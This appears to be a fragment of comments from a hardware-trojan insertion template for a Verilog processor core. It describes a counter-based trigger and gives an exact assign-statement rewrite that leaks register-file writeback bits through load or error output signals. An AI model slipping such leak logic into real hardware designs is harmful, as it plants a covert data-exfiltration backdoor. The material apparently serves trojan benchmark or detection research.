 ...
 *   
 * Trigger: Counter on rf_write_wb_o
 * Payload: Route outstanding_load_wb_o[0] to observable output
 * 
...
//   Find the assign for outstanding_load_wb_o (or rd_error_o as fallback):
//     assign outstanding_load_wb_o = <normal_expr>;
//   Replace with:
//     assign outstanding_load_wb_o = trojan_active ? rf_write_wb_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? rf_write_wb_o[0] : 1'b0;
//
